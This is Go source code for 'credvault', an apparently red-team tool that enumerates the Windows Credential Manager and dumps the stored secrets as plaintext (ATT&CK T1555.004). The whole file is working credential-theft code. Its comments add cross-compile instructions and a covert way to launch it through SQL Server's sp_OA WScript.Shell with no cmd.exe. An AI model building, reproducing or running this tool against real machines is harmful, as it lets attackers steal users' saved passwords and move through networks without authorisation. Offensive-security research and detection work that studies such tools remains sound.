// credvault: Windows Credential Manager enumeration and secret recovery.
//
// Replaces the two well-known Phase 2 Step 1 patterns in a single binary:
//
//   - cmdkey /list         -> CredEnumerateW over all stored credentials
//   - Get-StoredCredential -> CredReadW + blob decode (plain UTF-16, with
//     CredUnPackAuthenticationBufferW fallback for CredUI-packed blobs)
//
// Must run in-session as the user who owns the credential vault (same
// requirement as the CredentialManager PowerShell module): CredRead returns
// the decrypted blob only for the calling user's context - no offline DPAPI
// cracking needed.
//
// ATT&CK: T1555.004 (Credentials from Password Stores: Windows Credential
// Manager)
//
// # Build (cross-compile to Windows)
//
//	go mod tidy
//	GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o credvault.exe .
//
// # Usage
//
//	credvault [-o <output-file>] <subcommand> [args...]
//
//	credvault enum  [filter]     list stored credentials (cmdkey /list style)
//	credvault read  <target>     print user/secret for one credential target
//	credvault dump [filter]      enumerate + read every generic credential
//
// The -o flag redirects stdout to a file (stderr unchanged). Use it with
// sp_OA WScript.Shell.Run for cmd.exe-free execution from SQL Server: the
// caller reads the output file via sp_OA ADODB.Stream afterward.
//
// # Examples
//
//	credvault enum
//	credvault enum Microsoft:SSMS
//	credvault read "LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1"
//	credvault dump Microsoft:SSMS
//
// # Source layout
//
//	main.go - usage, subcommand dispatch, CredEnumerate/CredRead plumbing
package main

import (
	"fmt"
	"io"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

var (
	modadvapi32        = syscall.NewLazyDLL("advapi32.dll")
	procCredEnumerateW = modadvapi32.NewProc("CredEnumerateW")
	procCredReadW      = modadvapi32.NewProc("CredReadW")
	procCredFree       = modadvapi32.NewProc("CredFree")

	modcredui                           = syscall.NewLazyDLL("credui.dll")
	procCredUnPackAuthenticationBufferW = modcredui.NewProc("CredUnPackAuthenticationBufferW")
)

const (
	credTypeGeneric = 1

	credPersistSession      = 1
	credPersistLocalMachine = 2
	credPersistEnterprise   = 3
)

// CREDENTIAL mirrors CREDENTIALW (advapi32). Layout is identical on amd64;
// pointer fields are typed unsafe.Pointer so blob access does not need a
// uintptr round-trip.
type CREDENTIAL struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        FILETIME
	CredentialBlobSize uint32
	_                  uint32 // padding to pointer alignment
	CredentialBlob     unsafe.Pointer
	Persist            uint32
	AttributeCount     uint32
	Attributes         unsafe.Pointer
	TargetAlias        *uint16
	UserName           *uint16
}

type FILETIME struct {
	Lo uint32
	Hi uint32
}

// credEntry is the copied-out view of a CREDENTIALW; the native block is
// freed with CredFree before any output happens.
type credEntry struct {
	Target  string
	Type    string
	User    string
	Persist string
	Written time.Time
	Comment string
	BlobLen uint32
}

func lpwstr(p *uint16) string {
	if p == nil {
		return ""
	}
	n := 0
	for ptr := unsafe.Pointer(p); *(*uint16)(ptr) != 0; n++ {
		ptr = unsafe.Add(ptr, 2)
	}
	return syscall.UTF16ToString(unsafe.Slice(p, n))
}

func credTypeName(t uint32) string {
	switch t {
	case 1:
		return "Generic"
	case 2:
		return "DomainPassword"
	case 3:
		return "DomainCertificate"
	case 4:
		return "DomainVisiblePassword"
	case 5:
		return "GenericCertificate"
	case 6:
		return "DomainExtended"
	case 7:
		return "DomainCertificate"
	default:
		return "Type" + strconv.Itoa(int(t))
	}
}

func credPersistName(p uint32) string {
	switch p {
	case credPersistSession:
		return "Session"
	case credPersistLocalMachine:
		return "LocalMachine"
	case credPersistEnterprise:
		return "Enterprise"
	default:
		return "Persist" + strconv.Itoa(int(p))
	}
}

func filetimeToTime(ft FILETIME) time.Time {
	n := int64(ft.Hi)<<32 | int64(ft.Lo)
	return time.Unix(0, (n*100)-116444736000000000).UTC()
}

// blob looks like a plain UTF-16 secret (how CredWrite and cmdkey store
// generic credentials). Reject blobs with control characters.
func looksLikePlainUTF16(u []uint16) bool {
	for _, c := range u {
		if c < 0x20 && c != '\t' && c != '\r' && c != '\n' {
			return false
		}
	}
	return true
}

// unpackAuthBuffer decodes a CredUI packed authentication buffer
// (user/password pair) via credui!CredUnPackAuthenticationBufferW,
// sizing the output buffers with the required two-call pattern.
func unpackAuthBuffer(blob []byte) (string, string) {
	var ulen, dlen, plen uint32
	r, _, _ := procCredUnPackAuthenticationBufferW.Call(
		0,
		uintptr(unsafe.Pointer(&blob[0])), uintptr(len(blob)),
		0, uintptr(unsafe.Pointer(&ulen)),
		0, uintptr(unsafe.Pointer(&dlen)),
		0, uintptr(unsafe.Pointer(&plen)))
	if r == 0 {
		return "", ""
	}
	if ulen == 0 {
		ulen = 1
	}
	if plen == 0 {
		plen = 1
	}
	ub := make([]uint16, ulen)
	pb := make([]uint16, plen)
	r, _, _ = procCredUnPackAuthenticationBufferW.Call(
		0,
		uintptr(unsafe.Pointer(&blob[0])), uintptr(len(blob)),
		uintptr(unsafe.Pointer(&ub[0])), uintptr(unsafe.Pointer(&ulen)),
		0, uintptr(unsafe.Pointer(&dlen)),
		uintptr(unsafe.Pointer(&pb[0])), uintptr(unsafe.Pointer(&plen)))
	if r == 0 {
		return "", ""
	}
	return syscall.UTF16ToString(ub), syscall.UTF16ToString(pb)
}

// decodeBlob returns (user, secret) for a credential blob. Primary path is a
// direct UTF-16 decode of the blob; the CredUI pack fallback covers blobs
// stored by CredPackAuthenticationBufferW.
func decodeBlob(c *CREDENTIAL) (string, string) {
	if c.CredentialBlobSize == 0 || c.CredentialBlob == nil {
		return "", ""
	}
	blob := unsafe.Slice((*byte)(c.CredentialBlob), c.CredentialBlobSize)
	if c.CredentialBlobSize%2 == 0 {
		u := unsafe.Slice((*uint16)(c.CredentialBlob), c.CredentialBlobSize/2)
		if looksLikePlainUTF16(u) {
			return "", syscall.UTF16ToString(u)
		}
	}
	return unpackAuthBuffer(blob)
}

// enumerate all credentials (or those matching filter) via CredEnumerateW.
func credEnumerate(filter string) ([]credEntry, error) {
	var fp *uint16
	if filter != "" {
		var err error
		if fp, err = syscall.UTF16PtrFromString(filter); err != nil {
			return nil, err
		}
	}
	var count uint32
	var creds **CREDENTIAL
	r, _, errno := procCredEnumerateW.Call(
		uintptr(unsafe.Pointer(fp)),
		0,
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&creds)))
	if r == 0 {
		if errno == syscall.Errno(1168) { // ERROR_NOT_FOUND: vault empty for this filter
			return nil, nil
		}
		return nil, fmt.Errorf("CredEnumerateW failed: %v", errno)
	}

	entries := make([]credEntry, 0, count)
	raw := unsafe.Slice(creds, count)
	for _, c := range raw {
		e := credEntry{
			Target:  lpwstr(c.TargetName),
			Type:    credTypeName(c.Type),
			User:    lpwstr(c.UserName),
			Persist: credPersistName(c.Persist),
			Written: filetimeToTime(c.LastWritten),
			Comment: lpwstr(c.Comment),
			BlobLen: c.CredentialBlobSize,
		}
		entries = append(entries, e)
	}
	procCredFree.Call(uintptr(unsafe.Pointer(creds)))
	return entries, nil
}

// read a single generic credential via CredReadW and decode its secret.
func credRead(target string) (credEntry, string, string, error) {
	tp, err := syscall.UTF16PtrFromString(target)
	if err != nil {
		return credEntry{}, "", "", err
	}
	var c *CREDENTIAL
	r, _, errno := procCredReadW.Call(
		uintptr(unsafe.Pointer(tp)),
		credTypeGeneric,
		0,
		uintptr(unsafe.Pointer(&c)))
	if r == 0 {
		return credEntry{}, "", "", fmt.Errorf("CredReadW failed for %q: %v", target, errno)
	}
	e := credEntry{
		Target:  lpwstr(c.TargetName),
		Type:    credTypeName(c.Type),
		User:    lpwstr(c.UserName),
		Persist: credPersistName(c.Persist),
		Written: filetimeToTime(c.LastWritten),
		Comment: lpwstr(c.Comment),
		BlobLen: c.CredentialBlobSize,
	}
	user, secret := decodeBlob(c)
	procCredFree.Call(uintptr(unsafe.Pointer(c)))
	if user != "" {
		e.User = user
	}
	return e, user, secret, nil
}

func usage(w io.Writer) {
	fmt.Fprint(w, `credvault - Windows Credential Manager enumeration and secret recovery

Usage:
  credvault [-o <output-file>] <subcommand> [args...]

Subcommands:
  enum  [filter]      list stored credentials (cmdkey /list equivalent)
  read  <target>      print user/secret for one credential target
  dump [filter]       enumerate + read every generic credential

Examples:
  credvault enum
  credvault enum Microsoft:SSMS
  credvault dump Microsoft:SSMS
  credvault read "LegacyGeneric:target=Microsoft:SSMS:20:..."
`)
}

func run(args []string, w io.Writer) int {
	if len(args) > 2 && args[0] == "-o" {
		f, err := os.Create(args[1])
		if err != nil {
			fmt.Fprintf(os.Stderr, "[!] cannot open output file %s: %v\n", args[1], err)
			return 1
		}
		defer f.Close()
		w = f
		args = args[2:]
	}
	if len(args) == 0 {
		usage(w)
		return 2
	}

	switch args[0] {
	case "enum":
		filter := ""
		if len(args) > 1 {
			filter = args[1]
		}
		entries, err := credEnumerate(filter)
		if err != nil {
			fmt.Fprintf(w, "[!] %v\n", err)
			return 1
		}
		if len(entries) == 0 {
			fmt.Fprintf(w, "no credentials found (filter: %q)\n", filter)
			return 0
		}
		fmt.Fprintf(w, "Credential list: %d entries\n", len(entries))
		for i, e := range entries {
			fmt.Fprintf(w, "\n[%d] %s\n", i, e.Target)
			fmt.Fprintf(w, "    Type    : %s\n", e.Type)
			fmt.Fprintf(w, "    User    : %s\n", e.User)
			fmt.Fprintf(w, "    Persist : %s\n", e.Persist)
			fmt.Fprintf(w, "    Written : %s\n", e.Written.Format("2006-01-02 15:04:05"))
			if e.Comment != "" {
				fmt.Fprintf(w, "    Comment : %s\n", e.Comment)
			}
		}
		return 0

	case "read":
		if len(args) < 2 {
			usage(w)
			return 2
		}
		e, _, secret, err := credRead(args[1])
		if err != nil {
			fmt.Fprintf(w, "[!] %v\n", err)
			return 1
		}
		fmt.Fprintf(w, "Target   : %s\n", e.Target)
		fmt.Fprintf(w, "User     : %s\n", e.User)
		fmt.Fprintf(w, "Persist  : %s\n", e.Persist)
		if secret == "" {
			fmt.Fprint(w, "Secret   : (no secret stored in blob)\n")
		} else {
			fmt.Fprintf(w, "Secret   : %s\n", secret)
		}
		return 0

	case "dump":
		filter := ""
		if len(args) > 1 {
			filter = args[1]
		}
		entries, err := credEnumerate(filter)
		if err != nil {
			fmt.Fprintf(w, "[!] %v\n", err)
			return 1
		}
		if len(entries) == 0 {
			fmt.Fprintf(w, "no credentials found (filter: %q)\n", filter)
			return 0
		}
		found := 0
		for _, e := range entries {
			if e.Type != "Generic" {
				continue
			}
			_, _, secret, err := credRead(e.Target)
			if err != nil {
				fmt.Fprintf(w, "[!] %v\n", err)
				continue
			}
			found++
			fmt.Fprintf(w, "Target   : %s\n", e.Target)
			fmt.Fprintf(w, "User     : %s\n", e.User)
			if secret == "" {
				fmt.Fprint(w, "Secret   : (no secret stored in blob)\n")
			} else {
				fmt.Fprintf(w, "Secret   : %s\n", secret)
			}
			fmt.Fprint(w, "\n")
		}
		if found == 0 {
			fmt.Fprintf(w, "no Generic credentials matched filter %q\n", filter)
		}
		return 0

	default:
		fmt.Fprintf(w, "[!] unknown subcommand: %s\n\n", args[0])
		usage(w)
		return 2
	}
}

func main() {
	os.Exit(run(os.Args[1:], os.Stdout))
}
